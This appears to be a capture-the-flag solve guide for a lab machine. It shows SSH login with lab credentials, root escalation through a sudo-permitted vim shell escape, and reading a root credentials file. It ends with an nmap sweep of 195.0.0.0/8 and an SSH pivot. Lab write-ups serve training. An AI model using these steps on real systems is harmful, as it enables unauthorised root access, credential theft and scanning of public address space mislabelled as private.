# 🔴 Red Team — M3: nova-gateway Solve Guide

**Challenge:** Sudo Misconfiguration — vim GTFOBin Privilege Escalation  
**Technique:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching  
**Entry Point:** SSH as `devops` / `N0vaTech@24`

---

## Step 1 — SSH Login

```bash
ssh devops@<M3-IP>
# Password: N0vaTech@24
```

---

## Step 2 — Enumerate Sudo Permissions

```bash
sudo -l
```

Output:
```
(ALL) NOPASSWD: /usr/bin/vim
```

---

## Step 3 — GTFOBin — vim Privilege Escalation

```bash
sudo vim -c ':!/bin/bash'
```

Inside vim, you'll drop into a root bash shell.  
Alternatively, from within vim: press `:` then type `!/bin/bash` and hit Enter.

---

## Step 4 — Read the Flag

```bash
cat /root/flag3.txt
```

---

## Step 5 — Get Credentials for M4

```bash
cat /root/secrets.txt
# → backup:Backups3cure on M4 nova-scheduler
```

---

## Step 6 — Pivot to M4

```bash
# Scan private subnet for SSH
nmap -p 22 --open 195.0.0.0/8 --min-rate 2000

ssh backup@<M4-PRIV-IP>
# Password: Backups3cure
```

---

## Flag Location
`/root/flag3.txt`
